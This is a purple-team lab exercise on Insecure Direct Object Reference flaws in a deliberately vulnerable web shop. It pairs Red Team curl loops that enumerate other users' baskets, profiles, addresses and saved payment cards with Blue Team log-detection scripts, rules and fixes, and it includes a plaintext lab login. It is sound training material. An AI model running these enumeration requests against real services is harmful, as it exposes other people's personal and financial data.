# Purple Team Exercise 04: IDOR Attack & Defense

## 🎯 Overview

**Duration:** 35 minutes  
**Difficulty:** ⭐⭐ Intermediate  
**OWASP Category:** A01:2021 - Broken Access Control

In this exercise, the Red Team will exploit Insecure Direct Object Reference (IDOR) vulnerabilities to access unauthorized data while the Blue Team monitors and detects these access control violations in real-time.

---

## ⏱️ Timeline

| Time | Red Team Activity | Blue Team Activity |
|------|-------------------|-------------------|
| 0-5 min | Setup & account creation | Setup monitoring & baseline |
| 5-20 min | IDOR exploitation | Real-time detection |
| 20-30 min | Data exfiltration | Identify suspicious patterns |
| 30-35 min | Document findings | Create detection rules & report |

---

## 🔴 Red Team Instructions

### Target
```
Application: http://<VPS_IP>:8080
```

> **For this exercise:** All requests go through the nginx proxy so Blue Team can detect your attacks!

### Background: What is IDOR?

IDOR (Insecure Direct Object Reference) occurs when an application exposes internal object references (like database IDs) and fails to verify that the user has authorization to access those objects.

---

### Phase 1: Reconnaissance (5 minutes)

**Objective:** Identify endpoints that use object IDs

1. Create or use an existing account
2. Open browser developer tools (F12) → Network tab
3. Browse the application and watch for API calls with IDs
4. Note endpoints that contain numeric or predictable identifiers

**Key Endpoints to Identify:**
- `/api/Baskets/{id}` - Shopping baskets
- `/api/Users/{id}` - User profiles
- `/api/Cards/{id}` - Saved payment cards
- `/api/Addresss/{id}` - Saved addresses
- `/api/Recycles/{id}` - Recycle requests
- `/rest/basket/{id}` - Basket operations

---

### Phase 2: IDOR Attacks (15 minutes)

**Objective:** Access other users' data by manipulating IDs

#### Attack 1: Basket Enumeration

1. Log in with your user account
2. Add items to your basket and note your basket ID
3. Try accessing other users' baskets:

```bash
# Get your basket (note your ID, e.g., 6)
curl -H "Authorization: Bearer <YOUR_TOKEN>" \
     "http://<VPS_IP>:8080/rest/basket/6"

# Try other basket IDs
curl -H "Authorization: Bearer <YOUR_TOKEN>" \
     "http://<VPS_IP>:8080/rest/basket/1"

curl -H "Authorization: Bearer <YOUR_TOKEN>" \
     "http://<VPS_IP>:8080/rest/basket/2"

# Enumerate baskets 1-10
for i in {1..10}; do
    echo "=== Basket $i ==="
    curl -s -H "Authorization: Bearer <YOUR_TOKEN>" \
         "http://<VPS_IP>:8080/rest/basket/$i"
    echo
done
```

4. **Expected Result:** Access to other users' shopping baskets

#### Attack 2: User Profile Access

1. Find your user ID from `/rest/user/whoami`
2. Enumerate other user profiles:

```bash
# Get your own profile
curl -H "Authorization: Bearer <YOUR_TOKEN>" \
     "http://<VPS_IP>:8080/api/Users/1"

# Try accessing admin (usually ID 1)
curl -H "Authorization: Bearer <YOUR_TOKEN>" \
     "http://<VPS_IP>:8080/api/Users/1"

# Enumerate users
for i in {1..20}; do
    echo "=== User $i ==="
    curl -s -H "Authorization: Bearer <YOUR_TOKEN>" \
         "http://<VPS_IP>:8080/api/Users/$i" | jq '.email, .role'
    echo
done
```

#### Attack 3: Order History Access

```bash
# Access other users' orders
curl -H "Authorization: Bearer <YOUR_TOKEN>" \
     "http://<VPS_IP>:8080/api/Orders/1"

# Check order details with different IDs
for i in {1..5}; do
    curl -s -H "Authorization: Bearer <YOUR_TOKEN>" \
         "http://<VPS_IP>:8080/api/Orders/$i"
done
```

#### Attack 4: Feedback/Review Manipulation

```bash
# Get all feedbacks
curl "http://<VPS_IP>:8080/api/Feedbacks/"

# Try to access/modify specific feedback
curl -H "Authorization: Bearer <YOUR_TOKEN>" \
     "http://<VPS_IP>:8080/api/Feedbacks/1"
```

---

### Phase 3: Advanced Exploitation (10 minutes)

**Objective:** Exploit IDOR for more sensitive operations

#### Modify Another User's Basket

```bash
# Add item to someone else's basket
curl -X POST -H "Authorization: Bearer <YOUR_TOKEN>" \
     -H "Content-Type: application/json" \
     -d '{"ProductId": 1, "BasketId": 2, "quantity": 1}' \
     "http://<VPS_IP>:8080/api/BasketItems"
```

#### Access Saved Addresses

```bash
# Enumerate addresses (may contain PII)
for i in {1..10}; do
    curl -s -H "Authorization: Bearer <YOUR_TOKEN>" \
         "http://<VPS_IP>:8080/api/Addresss/$i"
done
```

#### Access Saved Payment Methods

```bash
# Enumerate payment cards (sensitive data!)
for i in {1..10}; do
    curl -s -H "Authorization: Bearer <YOUR_TOKEN>" \
         "http://<VPS_IP>:8080/api/Cards/$i"
done
```

---

### Red Team Deliverables

Document:
1. List of vulnerable IDOR endpoints discovered
2. Data accessed from other users
3. Screenshots/evidence of unauthorized access
4. Impact assessment (what sensitive data was exposed)

---

## 🔵 Blue Team Instructions

### Setup

```bash
# Connect to Blue Team server
ssh blueteam@<VPS_IP> -p 2222
# Password: defend123
```

### Phase 1: Establish Baseline (5 minutes)

```bash
# Start monitoring logs
tail -f /var/log/nginx/access.log

# Or use helper script
~/scripts/tail-logs.sh
```

---

### Phase 2: IDOR Detection (20 minutes)

#### Detect Sequential ID Access Patterns

IDOR attacks often show patterns of sequential ID enumeration:

```bash
# Look for sequential API access patterns
grep -E "/api/(Users|Baskets|Cards|Addresss|Orders)/[0-9]+" /var/log/nginx/access.log

# Count requests per endpoint per IP
grep -E "/api/Users/[0-9]+" /var/log/nginx/access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn

# Detect rapid enumeration (many requests in short time)
grep -E "/api/(Users|Baskets|Cards)/[0-9]+" /var/log/nginx/access.log | \
    awk '{print $1, $4}' | sort | uniq -c | sort -rn
```

#### Identify Suspicious ID Patterns

```bash
# Look for IDs being accessed in sequence
grep -oE "/api/[^/]+/[0-9]+" /var/log/nginx/access.log | sort | uniq -c | sort -rn

# Check for users accessing many different basket IDs
grep "/rest/basket/" /var/log/nginx/access.log | \
    awk '{print $1, $7}' | sort | uniq
```

#### Detect Unauthorized Access Attempts

```bash
# Look for 401/403 responses (failed access attempts)
grep -E " (401|403) " /var/log/nginx/access.log

# Find IPs with many failed access attempts
grep -E " (401|403) " /var/log/nginx/access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn
```

#### Create Custom Detection Script

```bash
#!/bin/bash
# detect-idor.sh - Detect potential IDOR attacks

LOG="/var/log/nginx/access.log"
THRESHOLD=5  # Alert if more than 5 different IDs accessed

echo "=== IDOR Attack Detection ==="
echo ""

# Check each suspicious endpoint
for endpoint in "Users" "Baskets" "Cards" "Addresss" "Orders"; do
    echo "--- Checking /api/$endpoint ---"
    grep "/api/$endpoint/" $LOG | \
        awk '{print $1}' | sort | uniq -c | \
        while read count ip; do
            if [ $count -gt $THRESHOLD ]; then
                echo "ALERT: $ip accessed $count different $endpoint IDs"
            fi
        done
done
```

---

### Phase 3: Kibana Monitoring

Access Kibana at `http://<VPS_IP>:5601`

#### Create IDOR Detection Query

```
# Detect API endpoint enumeration
message: ("/api/Users/" OR "/api/Baskets/" OR "/api/Cards/" OR "/rest/basket/")

# Look for sequential patterns
message: /api/* AND message: /[0-9]+

# Filter for potential unauthorized access
response_code: (401 OR 403)
```

#### Create Visualization

1. Go to Visualizations → Create new
2. Type: Data Table
3. Metrics: Count
4. Buckets: Split rows by `clientip.keyword` and `request.keyword`
5. Filter: API endpoints with numeric IDs

---

### Detection Signatures

```yaml
# Sample detection rules for IDOR
rules:
  - name: "Sequential ID Enumeration"
    pattern: "Same IP accessing >5 sequential IDs on same endpoint in 1 minute"
    severity: HIGH
    
  - name: "Cross-User Data Access"
    pattern: "User accessing basket/profile ID different from their own"
    severity: CRITICAL
    
  - name: "Sensitive Endpoint Enumeration"
    pattern: "Requests to /api/Cards or /api/Addresss with different IDs"
    severity: CRITICAL
```

---

### Blue Team Deliverables

1. **Attack Detection Report:**
   - Attacker IP(s) identified
   - Endpoints targeted
   - Timeline of attack
   - Number of records potentially accessed

2. **Recommended Mitigations:**
   - Implement proper authorization checks
   - Use UUIDs instead of sequential IDs
   - Add rate limiting per endpoint
   - Implement access logging and alerting

---

## 📊 Success Criteria

### Red Team Success
- [ ] Accessed another user's shopping basket
- [ ] Retrieved user profile information for other users
- [ ] Enumerated multiple object IDs successfully
- [ ] Identified at least 3 IDOR-vulnerable endpoints

### Blue Team Success
- [ ] Detected enumeration patterns in logs
- [ ] Identified attacker IP address
- [ ] Documented timeline of attack
- [ ] Created detection rules for IDOR attacks

---

## 🛡️ Remediation Guidance

### For Developers

1. **Authorization Checks:**
```javascript
// Bad - No authorization check
app.get('/api/basket/:id', (req, res) => {
    return Basket.findById(req.params.id);
});

// Good - Verify ownership
app.get('/api/basket/:id', (req, res) => {
    const basket = Basket.findById(req.params.id);
    if (basket.userId !== req.user.id) {
        return res.status(403).json({error: 'Unauthorized'});
    }
    return basket;
});
```

2. **Use Indirect References:**
```javascript
// Use UUIDs instead of sequential IDs
const basket = Basket.findByUUID(req.params.uuid);

// Or map to user's own objects
const basket = req.user.getBasket(); // No ID needed
```

3. **Implement Rate Limiting:**
```javascript
// Limit API requests per user/IP
rateLimit({
    windowMs: 60 * 1000, // 1 minute
    max: 30, // 30 requests per minute per endpoint
    keyGenerator: (req) => `${req.ip}-${req.path}`
});
```

---

## 📚 References

- [OWASP IDOR Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
- [PortSwigger IDOR Labs](https://portswigger.net/web-security/access-control/idor)
- [OWASP Top 10 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
